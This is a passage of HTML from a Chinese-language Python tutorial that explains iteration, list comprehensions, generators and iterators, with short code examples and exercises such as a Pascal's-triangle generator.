&#x27;:</span><br><span class="line">        s = s[:-1]</span><br><span class="line">    return s</span><br></pre></td></tr></table></figure><blockquote><p>✏️ 小结：</p></blockquote><p>有了切片操作，很多地方循环就不再需要了。Python 的切片非常灵活，一行代码就可以实现很多行循环才能完成的操作。</p><h2 id="3-2-迭代"><a href="#3-2-迭代" class="headerlink" title="3.2 迭代"></a>3.2 迭代</h2><blockquote><p>定义：如果给定一个 list 或 tuple，我们可以通过<code>for</code>循环来遍历这个 list 或 tuple，这种遍历我们称为迭代（Iteration）。</p></blockquote><p>迭代是通过 for … in 来完成的，Python 的<code>for</code>循环抽象程度要高于 C 的<code>for</code>循环，因为 Python 的<code>for</code>循环不仅可以用在 list 或 tuple 上，还可以作用在其他可迭代对象上。</p><p>list 这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如 dict 就可以迭代：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span><br><span class="line">for key in d:</span><br><span class="line">    print(key)</span><br></pre></td></tr></table></figure><p>因为 dict 的存储不是按照 list 的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</p><p>? 默认情况下，dict 迭代的是 key。如果要迭代 value，可以用<code>for value in d.values()</code>，如果要同时迭代 key 和 value，可以用<code>for k, v in d.items()</code>。</p><p>由于字符串也是可迭代对象，因此，也可以作用于<code>for</code>循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for ch in &#x27;ABC&#x27;:</span><br><span class="line">    print(ch)</span><br></pre></td></tr></table></figure><p>所以，当我们使用<code>for</code>循环时，只要作用于一个可迭代对象，<code>for</code>循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。</p><p>那么，如何判断一个对象是可迭代对象呢？方法是通过 collections 模块的 Iterable 类型判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance(&#x27;abc&#x27;, Iterable) # str是否可迭代</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance([1,2,3], Iterable) # list是否可迭代</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(123, Iterable) # 整数是否可迭代</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>最后一个小问题，如果要对 list 实现类似 Java 那样的下标循环怎么办？Python 内置的<code>enumerate</code>函数可以把一个 list 变成索引-元素对，这样就可以在<code>for</code>循环中同时迭代索引和元素本身：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i, value in enumerate([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]):</span><br><span class="line">...     print(i, value)</span><br><span class="line">...</span><br><span class="line">0 A</span><br><span class="line">1 B</span><br><span class="line">2 C</span><br></pre></td></tr></table></figure><p>上面的<code>for</code>循环里，同时引用了两个变量，在 Python 里是很常见的，比如下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for x, y in [(1, 1), (2, 4), (3, 9)]:</span><br><span class="line">...     print(x, y)</span><br><span class="line">...</span><br><span class="line">1 1</span><br><span class="line">2 4</span><br><span class="line">3 9</span><br></pre></td></tr></table></figure><blockquote><p>✏️ 练习题：</p></blockquote><p>请使用迭代查找一个 list 中最小和最大值，并返回一个 tuple：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def findMinAndMax(L):</span><br><span class="line">    if L == []:</span><br><span class="line">        return (None, None)</span><br><span class="line">    else:</span><br><span class="line">        MIN = L[0]</span><br><span class="line">        MAX = L[0]</span><br><span class="line">        for i in L:</span><br><span class="line">            MIN = min(MIN, i)</span><br><span class="line">            MAX = max(MAX, i) </span><br><span class="line">        return (MIN, MAX)</span><br><span class="line"># 测试</span><br><span class="line">if findMinAndMax([]) != (None, None):</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">elif findMinAndMax([7]) != (7, 7):</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">elif findMinAndMax([7, 1]) != (1, 7):</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">elif findMinAndMax([7, 1, 3, 9, 5]) != (1, 9):</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试成功!&#x27;)</span><br></pre></td></tr></table></figure><p>结果图：</p><p><img src="https://cos.gjcloak.xyz/images01/20200715205941.png" alt="结果图" title="结果图"></p><blockquote><p>✏️ 小结：</p></blockquote><p>任何可迭代对象都可以作用于<code>for</code>循环，包括我们自定义的数据类型，只要符合迭代条件，就可以使用<code>for</code>循环。</p><h2 id="3-3-列表生成式"><a href="#3-3-列表生成式" class="headerlink" title="3.3 列表生成式"></a>3.3 列表生成式</h2><p>列表生成式即 List Comprehensions，是 Python 内置的非常简单却强大的可以用来创建 list 的生成式。</p><p>举个例子，要生成 list <code>[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</code>可以用<code>list(range(1, 11))</code>：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716110013.png" alt="image-20200716110005465" title="image-20200716110005465"></p><p>但如果要生成<code>[1x1, 2x2, 3x3, ..., 10x10]</code>怎么做？</p><ul><li>方法一是循环：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L = []</span><br><span class="line">for x in range(1, 11):</span><br><span class="line">    L.append(x * x)</span><br><span class="line">L</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716110242.png" alt="image-20200716110241249" title="image-20200716110241249"></p><p>但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的 list：</p><ul><li>方法二：列表生成式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11)]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716110449.png" alt="image-20200716110448050" title="image-20200716110448050"></p><p>? 写列表生成式时，把要生成的元素<code>x * x</code>放到前面，后面跟<code>for</code>循环，就可以把 list 创建出来，十分有用，多写几次，很快就可以熟悉这种语法。</p><p>for 循环后面还可以加上 if 判断，这样我们就可以筛选出仅偶数的平方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11) if x % 2 == 0]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716110715.png" alt="image-20200716110714610" title="image-20200716110714610"></p><p>还可以使用两层循环，可以生成全排列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[m + n for m in &#x27;ABC&#x27; for n in &#x27;XYZ&#x27;]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716110816.png" alt="image-20200716110813806" title="image-20200716110813806"></p><p>三层和三层以上的循环就很少用到了。</p><p>运用列表生成式，可以写出非常简洁的代码。例如，列出当前目录下的所有文件和目录名，可以通过一行代码实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os # 导入os模块，模块的概念后面讲到</span><br><span class="line">[d for d in os.listdir(&#x27;.&#x27;)] # os.listdir可以列出文件和目录</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716111018.png" alt="image-20200716111017314" title="image-20200716111017314"></p><p><code>for</code>循环其实可以同时使用两个甚至多个变量，比如<code>dict</code>的<code>items()</code>可以同时迭代 key 和 value：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#x27;x&#x27;: &#x27;A&#x27;, &#x27;y&#x27;: &#x27;B&#x27;, &#x27;z&#x27;: &#x27;C&#x27; &#125;</span><br><span class="line">for k, v in d.items():</span><br><span class="line">    print(k, &#x27;=&#x27;, v)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716111307.png" alt="image-20200716111306467" title="image-20200716111306467"></p><p>因此，列表生成式也可以使用两个变量来生成 list：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#x27;x&#x27;: &#x27;A&#x27;, &#x27;y&#x27;: &#x27;B&#x27;, &#x27;z&#x27;: &#x27;C&#x27; &#125;</span><br><span class="line">[k + &#x27;=&#x27; + v for k, v in d.items()]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716111535.png" alt="image-20200716111534526" title="image-20200716111534526"></p><p>最后把一个 list 中所有的字符串变成小写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L = [&#x27;Hello&#x27;, &#x27;World&#x27;, &#x27;IBM&#x27;, &#x27;Apple&#x27;]</span><br><span class="line">[s.lower() for s in L]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716111756.png" alt="image-20200716111755472" title="image-20200716111755472"></p><h3 id="3-3-1-if-…-else"><a href="#3-3-1-if-…-else" class="headerlink" title="3.3.1 if … else"></a>3.3.1 if … else</h3><blockquote><p>使用列表生成式的时候，有些童鞋经常搞不清楚<code>if...else</code>的用法。</p></blockquote><p>例如，以下代码正常输出偶数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in range(1, 11) if x % 2 == 0]</span><br></pre></td></tr></table></figure><p>但是，我们不能在最后的<code>if</code>加上<code>else</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in range(1, 11) if x % 2 == 0 else 0]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716112210.png" alt="image-20200716112208908" title="image-20200716112208908"></p><p>这是因为跟在<code>for</code>后面的<code>if</code>是一个筛选条件，不能带<code>else</code>，否则如何筛选？</p><p>另一些童鞋发现把<code>if</code>写在<code>for</code>前面必须加<code>else</code>，否则报错：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716112357.png" alt="image-20200716112356893" title="image-20200716112356893"></p><p>这是因为<code>for</code>前面的部分是一个表达式，它必须根据<code>x</code>计算出一个结果。因此，考察表达式：<code>x if x % 2 == 0</code>，它无法根据<code>x</code>计算出结果，因为缺少<code>else</code>，必须加上<code>else</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x if x % 2 == 0 else -x for x in range(1, 11)]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716112507.png" alt="image-20200716112506596" title="image-20200716112506596"></p><p>上述<code>for</code>前面的表达式<code>x if x % 2 == 0 else -x</code>才能根据<code>x</code>计算出确定的结果。</p><p>可见，在一个列表生成式中，<code>for</code>前面的<code>if ... else</code>是表达式，而<code>for</code>后面的<code>if</code>是过滤条件，不能带<code>else</code>。</p><blockquote><p>✏️ 练习题：</p></blockquote><p>如果list中既包含字符串，又包含整数，由于非字符串类型没有<code>lower()</code>方法，所以列表生成式会报错：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716112808.png" alt="image-20200716112807607" title="image-20200716112807607"></p><p>使用内建的<code>isinstance</code>函数可以判断一个变量是不是字符串：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716113014.png" alt="image-20200716113013011" title="image-20200716113013011"></p><p>请修改列表生成式，通过添加<code>if</code>语句保证列表生成式能正确地执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">L1 = [&#x27;Hello&#x27;, &#x27;World&#x27;, 18, &#x27;Apple&#x27;, None]</span><br><span class="line">L2 = [s.lower() for s in L1 if isinstance(s,str)]</span><br><span class="line"># 测试:</span><br><span class="line">print(L2)</span><br><span class="line">if L2 == [&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;apple&#x27;]:</span><br><span class="line">    print(&#x27;测试通过!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716113245.png" alt="image-20200716113244975" title="image-20200716113244975"></p><blockquote><p>✏️ 小结：</p></blockquote><p>运用列表生成式，可以快速生成 list，可以通过一个 list 推导出另一个 list，而代码却十分简洁。</p><h2 id="3-4-生成器"><a href="#3-4-生成器" class="headerlink" title="3.4 生成器"></a>3.4 生成器</h2><blockquote><p>通过列表生成式，我们可以直接创建一个列表。但是，受到内存限制，列表容量肯定是有限的。而且，创建一个包含 100 万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p></blockquote><p>所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的 list，从而节省大量的空间。在 Python 中，这种<code>一边循环一边计算</code>的机制，称为生成器：generator。</p><p>? 要创建一个 generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的<code>[]</code>改成<code>()</code>，就创建了一个 generator：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716114556.png" alt="image-20200716114555027" title="image-20200716114555027"></p><p>创建<code>L</code>和<code>g</code>的区别仅在于最外层的<code>[]</code>和<code>()</code>，<code>L</code>是一个list，而<code>g</code>是一个 generator。</p><p>我们可以直接打印出 list 的每一个元素，但我们怎么打印出 generator 的每一个元素呢？</p><p>如果要一个一个打印出来，可以通过<code>next()</code>函数获得 generator 的下一个返回值：</p><p><img src="https://cos.gjcloak.xyz/images01/20200716115125.png" alt="image-20200716115124114" title="image-20200716115124114"></p><p>我们讲过，generator 保存的是算法，每次调用<code>next(g)</code>，就计算出<code>g</code>的下一个元素的值，直到计算到最后一个元素，没有更多的元素时，抛出<code>StopIteration</code>的错误。</p><p>当然，上面这种不断调用<code>next(g)</code>实在是太变态了，正确的方法是使用<code>for</code>循环，因为 generator 也是可迭代对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g = (x * x for x in range(10))</span><br><span class="line">for n in g:</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><p>所以，我们创建了一个 generator 后，基本上永远不会调用<code>next()</code>，而是通过<code>for</code>循环来迭代它，并且不需要关心<code>StopIteration</code>的错误。</p><p>generator 非常强大。如果推算的算法比较复杂，用类似列表生成式的<code>for</code>循环无法实现的时候，还可以用函数来实现。</p><p>比如，著名的斐波拉契数列（Fibonacci），除第一个和第二个数外，任意一个数都可由前两个数相加得到：</p><p>1, 1, 2, 3, 5, 8, 13, 21, 34, …</p><p>斐波拉契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def fib(max):</span><br><span class="line">    n, a, b = 0, 0, 1</span><br><span class="line">    while n &lt; max:</span><br><span class="line">        print(b)</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        n = n + 1</span><br><span class="line">    return &#x27;done&#x27;</span><br></pre></td></tr></table></figure><p>注意：</p><p>赋值语句：a, b &#x3D; b, a + b</p><p>相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (b, a + b) # t是一个tuple</span><br><span class="line">a = t[0]</span><br><span class="line">b = t[1]</span><br></pre></td></tr></table></figure><p>但不必显式写出临时变量 t 就可以赋值。</p><p>上面的函数可以输出斐波那契数列的前 N 个数：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207192025151.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20200716124358250" title="image-20200716124358250"></p><p>仔细观察，可以看出，<code>fib</code>函数实际上是定义了斐波拉契数列的推算规则，可以从第一个元素开始，推算出后续任意的元素，这种逻辑其实非常类似 generator。</p><p>也就是说，上面的函数和 generator 仅一步之遥。要把<code>fib</code>函数变成 generator，只需要把<code>print(b)</code>改为<code>yield b</code>就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def fib(max):</span><br><span class="line">    n, a, b = 0, 0, 1</span><br><span class="line">    while n &lt; max:</span><br><span class="line">        yield b</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        n = n + 1</span><br><span class="line">    return &#x27;done&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/pigo/202207192024510.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20200716124517165" title="image-20200716124517165"></p><p>这就是定义 generator 的另一种方法。如果一个函数定义中包含<code>yield</code>关键字，那么这个函数就不再是一个普通函数，而是一个 generator：</p><p>这里，最难理解的就是 generator 和函数的执行流程不一样。函数是顺序执行，遇到<code>return</code>语句或者最后一行函数语句就返回。而变成 generator 的函数，在每次调用<code>next()</code>的时候执行，遇到<code>yield</code>语句返回，再次执行时从上次返回的<code>yield</code>语句处继续执行。</p><p>举个简单的例子，定义一个 generator，依次返回数字 1，3，5：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def odd():</span><br><span class="line">    print(&#x27;step 1&#x27;)</span><br><span class="line">    yield 1</span><br><span class="line">    print(&#x27;step 2&#x27;)</span><br><span class="line">    yield(3)</span><br><span class="line">    print(&#x27;step 3&#x27;)</span><br><span class="line">    yield(5)</span><br></pre></td></tr></table></figure><p>调用该 generator 时，首先要生成一个 generator 对象，然后用<code>next()</code>函数不断获得下一个返回值：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207192024505.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20200716124859127" title="image-20200716124859127"></p><p>可以看到，<code>odd</code>不是普通函数，而是 generator，在执行过程中，遇到<code>yield</code>就中断，下次又继续执行。执行 3 次<code>yield</code>后，已经没有<code>yield</code>可以执行了，所以，第 4 次调用<code>next(o)</code>就报错。</p><p>回到<code>fib</code>的例子，我们在循环过程中不断调用<code>yield</code>，就会不断中断。当然要给循环设置一个条件来退出循环，不然就会产生一个无限数列出来。</p><p>同样的，把函数改成 generator 后，我们基本上从来不会用<code>next()</code>来获取下一个返回值，而是直接使用<code>for</code>循环来迭代：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for n in fib(6):</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><p>但是用<code>for</code>循环调用 generator 时，发现拿不到 generator 的<code>return</code>语句的返回值。如果想要拿到返回值，必须捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g = fib(6)</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        x = next(g)</span><br><span class="line">        print(&#x27;g:&#x27;, x)</span><br><span class="line">    except StopIteration as e:</span><br><span class="line">        print(&#x27;Generator return value:&#x27;, e.value)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200716125329.png" alt="image-20200716125328414" title="image-20200716125328414"></p><p>关于如何捕获错误，后面的错误处理还会详细讲解。</p><blockquote><p>✏️ 练习题：</p></blockquote><p><a href="http://baike.baidu.com/view/7804.htm">杨辉三角</a>定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">          1</span><br><span class="line">         / \</span><br><span class="line">        1   1</span><br><span class="line">       / \ / \</span><br><span class="line">      1   2   1</span><br><span class="line">     / \ / \ / \</span><br><span class="line">    1   3   3   1</span><br><span class="line">   / \ / \ / \ / \</span><br><span class="line">  1   4   6   4   1</span><br><span class="line"> / \ / \ / \ / \ / \</span><br><span class="line">1   5   10  10  5   1</span><br></pre></td></tr></table></figure><p>把每一行看做一个 list，试写一个 generator，不断输出下一行的 list：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def triangles():</span><br><span class="line">    L = [1]</span><br><span class="line">    while True:</span><br><span class="line">        yield L </span><br><span class="line">        L = [1] + [L[i] + L[i+1] for i in range(len(L) - 1)] + [1]</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n = 0</span><br><span class="line">results = []</span><br><span class="line">for t in triangles():</span><br><span class="line">    results.append(t)</span><br><span class="line">    n = n + 1</span><br><span class="line">    if n == 10:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">for t in results:</span><br><span class="line">    print(t)</span><br><span class="line"></span><br><span class="line">if results == [</span><br><span class="line">    [1],</span><br><span class="line">    [1, 1],</span><br><span class="line">    [1, 2, 1],</span><br><span class="line">    [1, 3, 3, 1],</span><br><span class="line">    [1, 4, 6, 4, 1],</span><br><span class="line">    [1, 5, 10, 10, 5, 1],</span><br><span class="line">    [1, 6, 15, 20, 15, 6, 1],</span><br><span class="line">    [1, 7, 21, 35, 35, 21, 7, 1],</span><br><span class="line">    [1, 8, 28, 56, 70, 56, 28, 8, 1],</span><br><span class="line">    [1, 9, 36, 84, 126, 126, 84, 36, 9, 1]</span><br><span class="line">]:</span><br><span class="line">    print(&#x27;测试通过!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p>generator 是非常强大的工具，在 Python 中，可以简单地把列表生成式改成 generator，也可以通过函数实现复杂逻辑的 generator。</p><p>要理解 generator 的工作原理，它是在<code>for</code>循环的过程中不断计算出下一个元素，并在适当的条件结束<code>for</code>循环。对于函数改成的 generator 来说，遇到<code>return</code>语句或者执行到函数体最后一行语句，就是结束 generator 的指令，<code>for</code>循环随之结束。</p><p>请注意区分普通函数和 generator 函数，普通函数调用直接返回结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = abs(6)</span><br><span class="line">&gt;&gt;&gt; r</span><br><span class="line">6</span><br></pre></td></tr></table></figure><p>generator 函数的“调用”实际返回一个 generator 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; g = fib(6)</span><br><span class="line">&gt;&gt;&gt; g</span><br><span class="line">&lt;generator object fib at 0x1022ef948&gt;</span><br></pre></td></tr></table></figure><h2 id="3-5-迭代器"><a href="#3-5-迭代器" class="headerlink" title="3.5 迭代器"></a>3.5 迭代器</h2><p>我们已经知道，可以直接作用于<code>for</code>循环的数据类型有以下几种：</p><p>一类是集合数据类型，如<code>list</code>、<code>tuple</code>、<code>dict</code>、<code>set</code>、<code>str</code>等；</p><p>一类是<code>generator</code>，包括生成器和带<code>yield</code>的 generator function。</p><p>这些可以直接作用于<code>for</code>循环的对象统称为可迭代对象：<code>Iterable</code>。</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterable</code>对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections.abc import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&#x27;abc&#x27;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(100, Iterable)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>而生成器不但可以作用于<code>for</code>循环，还可以被<code>next()</code>函数不断调用并返回下一个值，直到最后抛出<code>StopIteration</code>错误表示无法继续返回下一个值了。</p><p>可以被<code>next()</code>函数调用并不断返回下一个值的对象称为迭代器：<code>Iterator</code>。</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterator</code>对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections.abc import Iterator</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&#x27;abc&#x27;, Iterator)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>生成器都是<code>Iterator</code>对象，但<code>list</code>、<code>dict</code>、<code>str</code>虽然是<code>Iterable</code>，却不是<code>Iterator</code>。</p><p>把<code>list</code>、<code>dict</code>、<code>str</code>等<code>Iterable</code>变成<code>Iterator</code>可以使用<code>iter()</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(iter([]), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(iter(&#x27;abc&#x27;), Iterator)</span><br><span 